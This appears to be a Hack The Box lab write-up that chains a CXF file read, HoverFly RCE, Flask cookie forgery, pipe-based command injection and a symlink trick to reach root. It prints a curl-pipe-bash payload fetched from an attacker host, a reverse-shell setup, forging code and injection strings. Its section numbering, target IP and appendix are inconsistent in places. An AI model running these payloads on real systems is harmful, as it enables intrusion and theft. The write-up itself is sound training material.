# DevArea HTB — Full Writeup
## From Recon to Root: Deserialization RCE, CVE-2025-54123, and Flask Cookie Forgery

---

## 0. Reconnaissance

### 0.1 Port Scan

```bash
nmap -p- -n -Pn 10.129.244.208
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
8500/tcp open  fmtp
8888/tcp open  sun-answerbook
```

Six open ports gave a wide surface to triage:

| Port | Service | Initial hypothesis |
|------|---------|---------------------|
| 21 | FTP | Possibly anonymous login, worth a quick check but rarely the main path on modern boxes |
| 22 | SSH | Standard remote access, not directly exploitable without creds |
| 80 | HTTP | Main public-facing site, likely `devarea.htb` vhost |
| 8080 | HTTP (proxy/app) | Custom application — turned out to host `/employeeservice`, a Java-based service vulnerable to insecure deserialization (CVE-2022-46364) |
| 8500 | "fmtp" (nmap's generic guess) | Worth banner-grabbing manually since nmap's service guess for unusual ports is frequently wrong |
| 8888 | "sun-answerbook" (also a generic guess) | Turned out to be the front-end login / token-auth API for the box's main web app, and later the target of CVE-2025-54123 |

The lesson here: nmap's service-name guesses on non-standard ports (8500, 8888) are heuristic and often wrong — they should always be confirmed manually (`curl -v`, browser, or `nc` banner grab) rather than trusted at face value. In this box, port 8888 wasn't a "sun answerbook" service at all — it was a separate auth/token API for the main application.

### 0.2 Service Enumeration

Standard follow-up steps after the port scan would include:

```bash
echo "10.129.244.208 devarea.htb" | sudo tee -a /etc/hosts

curl -sI http://devarea.htb
curl -sI http://devarea.htb:8080
curl -sI http://devarea.htb:8500
curl -sI http://devarea.htb:8888

gobuster dir -u http://devarea.htb:8080 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://devarea.htb:8888 -w /usr/share/wordlists/dirb/common.txt
```

This kind of probing on port 8080 is what revealed an exposed endpoint — `/employeeservice` — that turned out to be a Java backend accepting a serialized object as part of its request handling. That's the entry point into the next stage.

---

## 1. Initial Foothold — CVE-2022-46364 (Apache CXF arbitrary URI fetch / local file read)

### 1.1 The Vulnerability

CVE-2022-46364 affects **Apache CXF**, a popular Java framework for building SOAP/REST web services. The flaw lets an attacker control how the framework resolves a `StreamSource` from a request, tricking the server into fetching or reading a URI of the attacker's choosing — including local files via the `file://` scheme.

In practice: a crafted request to a vulnerable CXF endpoint makes the *server itself* read an arbitrary local file and reflect its content back, or make an outbound request to an attacker-controlled URL (SSRF).

### 1.2 Exploitation

```bash
python3 CVE-2022-46364.py -t http://devarea.htb:8080/employeeservice -s file:///etc/systemd/system/hoverfly.service -d devarea.htb
```

Flags:
- `-t` — target endpoint (the vulnerable CXF service found on port 8080)
- `-s` — the source URI to coerce the server into fetching; here, a **local file read** via `file://`, targeting a systemd unit file
- `-d` — the domain/vhost to use in the crafted request (CXF/SOAP services are often vhost-sensitive)

### 1.3 Why This Particular File?

`/etc/systemd/system/hoverfly.service` was a deliberate target, not a random guess. Systemd unit files frequently embed the **exact command line used to start a service**, including any flags passed at startup — and on poorly hardened systems, that sometimes includes secrets passed directly as CLI arguments (process command lines are visible via `ps aux` or `/proc/<pid>/cmdline` too, so this is a known antipattern regardless of this particular file-read bug).

The retrieved file contained:

```ini
[Unit]
Description=HoverFly service
After=network.target
[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal
[Install]
WantedBy=multi-user.target
```

Two critical pieces of intel came out of this single file read:

1. **`-add -username admin -password O7IJ27MyyXiU`** — admin credentials for the HoverFly service, hardcoded directly into the unit file's `ExecStart` line
2. **`User=dev_ryan`** — the OS user the service runs as, which becomes the foothold account once that service is compromised

This is a textbook case of **arbitrary file read → credential disclosure**: the file doesn't need to *be* a password file, it just needs to *contain* one, and systemd unit files are a very common place for that to accidentally happen.

---

## 2. From Credentials to RCE — CVE-2025-54123

### 2.1 What HoverFly Is

HoverFly is an open-source API simulation/service virtualization tool. With valid admin credentials, you can interact with its management API — and in vulnerable versions, certain management operations can be abused to achieve **remote code execution**, tracked as CVE-2025-54123.

### 2.2 Exploitation

```bash
python3 CVE-2025-54123.py -t http://devarea.htb:8888 -u admin -p O7IJ27MyyXiU -c "curl http://10.10.14.196:8000/shell.sh | bash"
```

Flags:
- `-t` — the HoverFly management interface (port 8888, confirmed during recon as the actual auth/management API rather than nmap's generic "sun-answerbook" guess)
- `-u` / `-p` — admin credentials recovered from the leaked systemd unit file
- `-c` — the command executed on the target once the exploit achieves code execution

The payload follows the classic **download-and-execute** pattern: a short `curl | bash` one-liner that pulls a larger reverse-shell script from an attacker-controlled HTTP server and runs it immediately, rather than trying to cram a full reverse shell into a single command-line argument.

### 2.3 Catching the Shell

Two things need to run simultaneously on the attacker side before triggering the exploit:

```bash
# 1. Serve the shell script
python3 -m http.server 8000

# 2. Listener for the reverse connection
nc -lnvp 4444
```

Once triggered, the target pulls `shell.sh`, executes it, and calls back:

```
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.196] from (UNKNOWN) [10.129.18.150] 57804
sh: 0: can't access tty; job control turned off
$ id
uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
```

This confirms the shell's privilege matches exactly what the leaked unit file predicted (`User=dev_ryan`), and the user flag becomes readable:

```bash
$ cat /home/dev_ryan/user.txt
2f899121fe2cf5********************
```

### 2.4 Shell Stabilization

A raw `nc` listener shell is "dumb" — no job control, no tab completion, breaks on Ctrl+C. Standard upgrade:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z to background, then on the attacker terminal:
stty raw -echo; fg
# press Enter twice after fg
```

This gives a fully interactive TTY, which matters for the privilege escalation phase below, since some later steps (interactive `sudo`, heredocs) are unreliable over a raw pipe.

---

## 3. Privilege Escalation — Where The Cookie-Forgery Analysis Picks Up

At this point in the box, we had:

- A low-privileged shell as `dev_ryan`
- Read access to `/etc/syswatch.env`, which leaked a Flask `SECRET_KEY` belonging to the internal `SysWatch GUI` web app (a separate secret, unrelated to the HoverFly credentials from the previous stage):
  ```
  SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
  ```
- Knowledge that an internal-only Flask web app (`SysWatch GUI`) was listening on `127.0.0.1:7777`
- A documented command-injection vector inside that app's `/service-status` endpoint, triggered through a crafted `session` cookie

The problem: we had the secret key but no valid admin credentials for that internal app, and no Flask/itsdangerous installed on the target to generate a cookie "the easy way."

This part of the writeup focuses specifically on **why leaking a Flask `SECRET_KEY` is equivalent to leaking admin credentials**, and how that translates into a forged authentication cookie.

---

## 2. How Flask Sessions Actually Work

This is the part most people skip past without understanding, and it's the key to the whole exploit.

### 2.1 Sessions are NOT stored server-side by default

Most web frameworks (Django, most Java frameworks, etc.) use **server-side sessions**: the cookie just holds a random session ID, and the actual data (`user_id`, `is_admin`, etc.) lives in a database or in-memory store on the server. The client never sees the real data.

Flask, by default, does the opposite. It uses **client-side sessions**: the entire session dictionary (e.g. `{"user_id": 1, "username": "admin"}`) is serialized, **cryptographically signed**, and shipped to the browser as the cookie itself. Nothing is stored server-side.

This means: if you can forge a validly-signed cookie, you don't need a server-side session store entry — the server will trust whatever signed data you hand it back.

### 2.2 The cookie is signed, not encrypted

This is critical to understand. Flask session cookies are:

- **Signed** → you can read the contents (it's just base64), but you cannot modify them without invalidating the signature
- **NOT encrypted** → the JSON payload is plainly visible to anyone who decodes the base64

So a normal Flask session cookie, like:
```
eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.HRbL6Q.h0QcyLgsBHq2vRL5hVX4vz15WmA
```

splits into **three dot-separated parts**:

| Part | Content | Purpose |
|------|---------|---------|
| `eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0` | Base64 of `{"user_id":1,"username":"admin"}` | The actual session data (readable!) |
| `HRbL6Q` | Base64 of a timestamp | When the session was created (for expiry checks) |
| `h0QcyLgsBHq2vRL5hVX4vz15WmA` | HMAC signature | Proof the data wasn't tampered with |

You can decode the first part right now with zero secrets:
```bash
echo "eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0" | base64 -d
# {"user_id":1,"username":"admin"}
```

**The only thing standing between you and forging an admin session is the signature** — and the signature is just an HMAC computed from the payload + a server-side secret key.

### 2.3 The mechanism: itsdangerous

Flask delegates signing to a library called **itsdangerous**. The class used is `SecureCookieSessionInterface`, and the actual primitive underneath is a `URLSafeTimedSerializer`.

Conceptually, signing a session works like this:

```
1. payload = json.dumps(session_dict)          # {"user_id":1,"username":"admin"}
2. payload_b64 = base64url(payload)
3. timestamp_b64 = base64url(current_time)
4. value = payload_b64 + "." + timestamp_b64
5. signing_key = HMAC(SECRET_KEY, salt="cookie-session")   # key derivation step
6. signature = HMAC(signing_key, value, sha1)
7. cookie = value + "." + base64url(signature)
```

**The crucial insight:** step 5 and 6 only require `SECRET_KEY`. There is no database lookup, no password check, no server round-trip. If you have the `SECRET_KEY`, you can compute the exact same signature the server would compute — for *any* payload you want, including `{"user_id": 1, "username": "admin"}`.

This is exactly why a leaked Flask `SECRET_KEY` is as good as game over for that application's authentication. It's not a "vulnerability" in the cryptography — HMAC-SHA1 is fine here — it's that **the secret meant to stay server-side leaked**, and once an attacker has it, they are cryptographically indistinguishable from the legitimate server when it comes to signing sessions.

---

## 3. Why We Couldn't Just Use Flask Directly On The Box

The "intended" / reference exploit looks like this:

```python
from flask.sessions import SecureCookieSessionInterface
from flask import Flask

app = Flask(__name__)
app.secret_key = "f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725"

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
session_data = {"user_id": 1, "username": "admin"}
forged_cookie = session_serializer.dumps(session_data)
print(forged_cookie)
```

This works perfectly — **but only if `flask` (and its dependency `itsdangerous`) is installed**. On the `dev_ryan` shell on the target box, only the Python standard library was available:

```bash
python3 -c "import hashlib, hmac, base64"   # OK
python3 -c "import flask"                   # ModuleNotFoundError
```

We had two real options:

1. **Reimplement the itsdangerous signing algorithm by hand** using only `hashlib`/`hmac`/`base64`/`json`/`struct` (the stdlib path)
2. **Run the reference script on a different machine** that *does* have `pip` access (e.g., the attacker's own Kali box), and just copy the resulting cookie string over

Both are legitimate. Option 2 is far less error-prone because you're using the real, battle-tested implementation instead of re-deriving every byte of the wire format by hand. That's ultimately what worked in this box — installing `flask` on the attacking machine and generating the cookie there, then pasting the forged token into the `curl` request executed on the target.

Option 1 is still worth understanding, because it's what almost worked, and shows you exactly which details of the format are easy to get subtly wrong.

---

## 4. The Manual Reimplementation Attempt (And Why It's Tricky)

Here's a hand-rolled version of the same logic:

```python
import hashlib, hmac, base64, json, time, struct

SECRET_KEY = "f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725"
SALT = "cookie-session"
EPOCH = 1293840000  # itsdangerous custom epoch: 2011-01-01

def b64encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')

def derive_key(secret_key, salt):
    return hmac.new(secret_key.encode(), salt.encode(), hashlib.sha1).digest()

def forge_session(session_data):
    payload_json = json.dumps(session_data, separators=(',', ':')).encode()
    payload_b64 = b64encode(payload_json)

    ts = int(time.time()) - EPOCH
    ts_bytes = struct.pack('>Q', ts).lstrip(b'\x00') or b'\x00'
    ts_b64 = b64encode(ts_bytes)

    value = payload_b64 + b'.' + ts_b64
    key = derive_key(SECRET_KEY, SALT)
    sig = hmac.new(key, value, hashlib.sha1).digest()

    return (value + b'.' + b64encode(sig)).decode()

print(forge_session({"user_id": 1, "username": "admin"}))
```

This produces a syntactically valid-looking three-part cookie. **But in our case it did not authenticate** — the server kept redirecting back to `/login`. Several things can cause a mismatch here, and it's worth listing them because each one is a real-world gotcha:

| Possible mismatch | Why it breaks the signature |
|---|---|
| **JSON serialization details** | Flask doesn't use plain `json.dumps()` — it uses a `TaggedJSONSerializer`, which adds special tags for non-trivial types (datetimes, tuples, etc.) and may format simple dicts slightly differently depending on version. Even one different byte in the payload breaks the HMAC. |
| **Key derivation function** | itsdangerous supports multiple `key_derivation` strategies: `"hmac"` (most common default), `"django-concat"`, and `"none"`. If you guess the wrong one, every signature will be wrong even with the correct secret key. |
| **Salt value** | Flask's default salt is `"cookie-session"`, but this is itself just a default — if it were configured differently, signatures won't line up. |
| **Digest algorithm** | Some itsdangerous configurations use SHA1, others SHA256 for the inner/outer HMAC layers — version dependent. |
| **itsdangerous version drift** | The exact byte-level serialization format (timestamp encoding in particular) has changed slightly across itsdangerous major versions. A hand implementation tuned for one version can silently fail against another. |

In short: **the algorithm is documented, but the implementation has just enough version-specific nuance that hand-rolling it byte-for-byte is genuinely error prone.** This is a good lesson on its own — cryptographic *correctness* (using HMAC) doesn't guarantee *interoperability* unless you match the exact framework's serialization format.

---

## 5. The Working Approach

Given the above, the reliable fix was simple: **don't reimplement itsdangerous — use it.**

On a machine with internet access (the attacking box, not the target):

```bash
pip3 install flask
```

```python
from flask.sessions import SecureCookieSessionInterface
from flask import Flask

app = Flask(__name__)
app.secret_key = "f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725"

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
session_data = {"user_id": 1, "username": "admin"}
forged_cookie = session_serializer.dumps(session_data)
print(forged_cookie)
```

This uses Flask's actual, internal serializer configuration (correct salt, correct key derivation, correct JSON tagging) — so the resulting signature is guaranteed to match what the live server expects, because it's running the *exact same code* the server runs.

The forged cookie was then used directly against the internal service:

```bash
curl -b "session=<FORGED_COOKIE>" \
  -X POST http://127.0.0.1:7777/service-status \
  -d "service=test"
```

— now authenticated as `{"user_id": 1, "username": "admin"}` without ever knowing the real admin password.

---

## 6. Chaining Into RCE → Root Flag

Once authenticated, the underlying vulnerability in `/service-status` was a classic **command injection via `shell=True`**, combined with an **incomplete sanitization regex**:

```python
SAFE_SERVICE = re.compile(r"^[^;/&.<>\rA-Z]*$")
res = subprocess.run(
    [f"systemctl status --no-pager {service}"],
    shell=True,
    capture_output=True,
    text=True,
    timeout=10
)
```

The regex blocks `;`, `/`, `&`, `.`, `<`, `>`, and uppercase letters — but **not the pipe character `|`**. Since the command still runs through `shell=True`, a pipe is enough to chain in arbitrary commands:

```
service=test | <arbitrary command>
```

The `/` and `.` characters needed for filesystem paths were smuggled in using **octal escape sequences via `printf`**, since `$(printf '\057')` evaluates to `/` and `$(printf '\056')` evaluates to `.` at shell execution time — by which point the regex has already passed (it only ever sees the literal backslash-and-digits string, not the resulting slash).

From there, the path to root was a **symlink chain attack** against the `syswatch.sh` "logs" feature:

1. The privileged log viewer (`sudo /opt/syswatch/syswatch.sh logs <file>`) only allowed reading files from inside its own `LOG_DIR`, and only followed symlinks whose target started with `/var/log/*` or matched a "plain filename" pattern.
2. Using the command injection (running as the `syswatch`/service user via the internal web app, which apparently had write access where `dev_ryan` did not), two symlinks were created:
   - `chain.log → /root/root.txt` (a direct symlink that the script's sanitization would refuse to follow directly, since the target contains `/`)
   - `evil.log → chain.log` (a symlink to a *plain filename inside the log directory*, which the script's logic *does* allow, because relative same-directory symlink targets pass its safety regex)
3. Reading `evil.log` through the trusted root-running script meant: `evil.log → chain.log → /root/root.txt`, and the script happily `cat`'d the final target because **each individual hop in the chain passed its own check in isolation**, even though the end-to-end path was unsafe.

```bash
sudo /opt/syswatch/syswatch.sh logs evil.log
# prints the contents of /root/root.txt
```

This is a classic **TOCTOU/symlink validation bypass**: validating "is this immediate symlink target safe" is not the same as validating "is the fully-resolved target safe," and chaining two hops was enough to slip through.

---

## 7. Key Takeaways

1. **A leaked Flask `SECRET_KEY` is a full authentication bypass**, not just a "secret" in the abstract sense — it lets an attacker forge any session they want, for any user, with zero knowledge of real credentials.
2. **Flask session cookies are signed, not encrypted.** Anyone can read them; the security entirely rests on the secret key.
3. **Don't reimplement crypto/serialization libraries by hand if you can avoid it** — itsdangerous's wire format has enough version-specific subtlety (key derivation mode, JSON tagging, salt, digest) that hand-rolling it is a real source of false negatives. Installing the real library elsewhere and copying the output is more reliable.
4. **Regex-based command sanitization is fragile.** Blocking specific characters (`;`, `/`, `.`, etc.) while still using `shell=True` is not equivalent to safety — anything not explicitly blocked (here, `|`) is fair game, and even blocked characters can be smuggled in via shell-level encoding tricks like `printf` octal escapes.
5. **Symlink validation needs to check the fully-resolved target, not just the immediate one hop.** Chaining two "individually safe" symlinks bypassed a check that only ever looked one level deep.

---

## Appendix: Full Exploit Chain Summary

```
[1] Leak SECRET_KEY via LFI/file read → /etc/syswatch.env
[2] Forge Flask session cookie offline (real Flask lib) → bypass internal app auth
[3] Command injection via | in /service-status (regex didn't block pipe)
[4] Smuggle / and . past regex using printf octal escapes ($(printf '\057'))
[5] Create symlink chain: evil.log -> chain.log -> /root/root.txt
[6] Read evil.log via privileged sudo script -> root.txt contents disclosed
```